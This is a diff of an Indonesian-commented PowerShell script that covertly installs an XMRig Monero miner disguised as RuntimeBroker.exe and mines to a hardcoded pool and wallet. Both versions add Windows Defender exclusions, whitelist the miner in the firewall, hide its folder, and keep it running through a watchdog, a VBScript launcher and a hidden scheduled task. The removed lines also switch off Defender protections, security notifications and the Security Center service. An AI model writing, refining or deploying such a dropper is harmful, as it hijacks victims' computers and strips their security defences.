@@ -1,162 +1,127 @@
-# ==========================================
-# 1. MATIKAN TOTAL TAMENG DEFENDER & NOTIFIKASI
-# ==========================================
-Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
-Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue
-Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue
+$ErrorActionPreference = "Continue"
 
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
-Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue
-
-Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
-Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
-
-# ==========================================
-# 2. INISIALISASI DIREKTORI & TARGET
-# ==========================================
-$PossibleDirs = @(
-    "C:\Users\Public\Libraries",
-    "$env:ProgramData\Microsoft\Windows\Templates",
-    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
-    "$env:PUBLIC\Documents"
-)
-
-$Dir = ""
-foreach ($Candidate in $PossibleDirs) {
-    try {
-        if (!(Test-Path $Candidate)) {
-            New-Item -ItemType Directory -Force -Path $Candidate -ErrorAction Stop | Out-Null
-        }
-        $TestFile = Join-Path $Candidate "test.tmp"
-        Set-Content -Path $TestFile -Value "test" -ErrorAction Stop
-        Remove-Item -Path $TestFile -Force -ErrorAction SilentlyContinue
-        $Dir = $Candidate
-        break
-    } catch {
-        continue
-    }
+function Log-Step($msg) {
+    Write-Host "[DEBUG] $msg" -ForegroundColor Cyan
+    Start-Sleep -Milliseconds 300
 }
 
-if ([string]::IsNullOrEmpty($Dir)) {
-    $Dir = Join-Path $env:TEMP "WinUpdateCache"
+try {
+    Log-Step "Memulai setup dengan Priority BelowNormal & tanpa TLS..."
+
+    $Dir = "C:\Users\Public\Documents\Core"
     if (!(Test-Path $Dir)) {
         New-Item -ItemType Directory -Force -Path $Dir | Out-Null
     }
-}
 
-$ExeName = "RuntimeBroker.exe" 
-$ExePath = Join-Path $Dir $ExeName
-$VbsPath = Join-Path $Dir "run.vbs"
-$ZipPath = Join-Path $env:TEMP "up.zip"
-$Pool = "gulf.moneroocean.stream:10128"
-$Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
-$ArgsList = "-o $Pool -u $Wallet -p x --tls --donate-level=1 --cpu-max-threads-hint=45 --background"
+    $ExeName = "RuntimeBroker.exe" 
+    $ExePath = Join-Path $Dir $ExeName
+    $VbsPath = Join-Path $Dir "run.vbs"
+    $ZipPath = Join-Path $env:TEMP "up.zip"
+    $WatcherScriptPath = Join-Path $Dir "monitor.ps1"
 
-# ==========================================
-# HENTIKAN PROSES MINER DI FOLDER TARGET SECARA PAKSA SEBELUM COPY
-# ==========================================
-Get-CimInstance Win32_Process | Where-Object { $_.Path -eq $ExePath } | ForEach-Object {
-    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
-}
-Stop-Process -Name "wscript", "powershell" -ErrorAction SilentlyContinue
-Unregister-ScheduledTask -TaskName "RuntimeBrokerService" -Confirm:$false -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 2
+    $Pool = "gulf.moneroocean.stream:10128"
+    $Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
+    # Parameter --tls dihapus sesuai permintaan
+    $ArgsList = "-o $Pool -u $Wallet -p x --donate-level=1 --cpu-max-threads-hint=45 --background"
 
-# ==========================================
-# 3. KUNCI FOLDER & DEFENDER EXCLUSION
-# ==========================================
-try {
-    $Acl = Get-Acl $Dir
-    $DenyRule = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Users", "Delete, DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")
-    $Acl.AddAccessRule($DenyRule)
-    Set-Acl $Dir $Acl -ErrorAction SilentlyContinue
-} catch {}
+    # Hentikan proses lama
+    Log-Step "Mematikan proses miner dan watchdog lama..."
+    Get-Process -Name "RuntimeBroker", "wscript", "powershell" -ErrorAction SilentlyContinue | Where-Object { 
+        $_.Path -eq $ExePath -or $_.Path -like "$Dir*" 
+    } | Stop-Process -Force -ErrorAction SilentlyContinue
 
-Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionProcess $ExeName -ErrorAction SilentlyContinue
+    Stop-Process -Name "RuntimeBroker" -Force -ErrorAction SilentlyContinue
+    Unregister-ScheduledTask -TaskName "RuntimeBrokerMonitor" -Confirm:$false -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2
 
-# ==========================================
-# 4. UNDUH & EKSTRAK BINER XMRIG
-# ==========================================
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$DownloadUrl = "https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.zip"
-Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipPath
+    # Eksklusi Windows Defender & Firewall
+    Log-Step "Menambahkan Defender Exclusion & Firewall Whitelist..."
+    Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess $ExeName -ErrorAction SilentlyContinue
 
-if (Test-Path $ZipPath) {
+    Remove-NetFirewallRule -DisplayName "Runtime Broker Monitor (Outbound)" -ErrorAction SilentlyContinue
+    Remove-NetFirewallRule -DisplayName "Runtime Broker Monitor (Inbound)" -ErrorAction SilentlyContinue
+    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
+    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
+
+    # Download & Ekstrak Miner
+    Log-Step "Mengunduh miner..."
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    (New-Object System.Net.WebClient).DownloadFile("https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.zip", $ZipPath)
+
+    Log-Step "Mengekstrak file..."
     Expand-Archive -Path $ZipPath -DestinationPath $env:TEMP -Force
+    Start-Sleep -Seconds 1
     
     $ExtractedExe = Get-ChildItem -Path $env:TEMP -Filter "xmrig.exe" -Recurse | Select-Object -First 1
-    
-    if ($ExtractedExe -and (Test-Path $ExtractedExe.FullName)) { 
+    if ($ExtractedExe) { 
         Copy-Item -Force $ExtractedExe.FullName $ExePath 
+    } else {
+        throw "xmrig.exe tidak ditemukan setelah ekstrak!"
     }
     
     Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue
     Set-ItemProperty -Path $Dir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue
 
-    # ==========================================
-    # 5. OTOMATIS WHITELIST FIREWALL
-    # ==========================================
-    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
-    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
-
-    # ==========================================
-    # 6. STABLE WATCHDOG & IDLE PRIORITY
-    # ==========================================
+    # =========================================================
+    # SMART WATCHDOG (Priority BelowNormal & Auto-Refresh)
+    # =========================================================
+    Log-Step "Membuat script smart watchdog dengan BelowNormal..."
     $ScriptBlockCode = @"
 `$ExePath = "$ExePath"
 `$ArgsList = "$ArgsList"
+`$RestartCounter = 0
 
 while (`$true) {
     `$Running = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -eq `$ExePath }
+    
     if (!`$Running) {
         Start-Process -FilePath `$ExePath -ArgumentList `$ArgsList -WindowStyle Hidden
     } else {
         foreach (`$p in `$Running) {
-            try {
-                `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle
+            try { 
+                # Diubah ke BelowNormal sesuai permintaan
+                `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal 
             } catch {}
         }
     }
-    Start-Sleep -Seconds 10
+
+    # Refresh total setiap 2 jam sekali untuk mencegah hang koneksi
+    `$RestartCounter++
+    if (`$RestartCounter -ge 240) { # 240 x 30 detik = 120 menit
+        Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -eq `$ExePath } | Stop-Process -Force -ErrorAction SilentlyContinue
+        `$RestartCounter = 0
+    }
+
+    Start-Sleep -Seconds 30
 }
 "@
-    $WatcherScriptPath = Join-Path $Dir "monitor.ps1"
     Set-Content -Path $WatcherScriptPath -Value $ScriptBlockCode -Force
 
-    # ==========================================
-    # 7. PEMBUATAN VBSCRIPT BACKGROUND
-    # ==========================================
     $VbsScriptContent = @"
 Dim shell
 Set shell = CreateObject("Wscript.Shell")
 shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$WatcherScriptPath""", 0, False
 "@
     Set-Content -Path $VbsPath -Value $VbsScriptContent -Force
-    Add-MpPreference -ExclusionPath $VbsPath -ErrorAction SilentlyContinue
 
-    # ==========================================
-    # 8. TASK SCHEDULER SYSTEM PRIVILEGE
-    # ==========================================
+    # Task Scheduler Persistensi
+    Log-Step "Mendaftarkan Task Scheduler..."
     $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPath`""
-    $Trigger = @(
-        (New-ScheduledTaskTrigger -AtStartup),
-        (New-ScheduledTaskTrigger -AtLogOn)
-    )
-    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType Service -RunLevel Highest
-    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 3
-    
-    Register-ScheduledTask -TaskName "RuntimeBrokerService" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
+    $Trigger = New-ScheduledTaskTrigger -AtLogOn
+    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
+    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
 
-    # Jalankan langsung
+    Register-ScheduledTask -TaskName "RuntimeBrokerMonitor" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
+
+    # Jalankan proses tanpa TLS
     Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden
 
-    Write-Host "Setup sukses! Proses berjalan sebagai RuntimeBroker dengan TLS, Firewall Whitelist, dan Idle Throttling 45%." -ForegroundColor Green
-} else {
-    Write-Host "Gagal mengunduh biner miner." -ForegroundColor Red
+    Write-Host "[+] SETUP SELESAI! Parameter TLS dihapus & Priority diset ke BelowNormal." -ForegroundColor Green
 }
+catch {
+    Write-Host "[-] TERJADI ERROR: $_" -ForegroundColor Red
+}
+
+Write-Host "Tekan Enter untuk keluar..."
+Read-Host
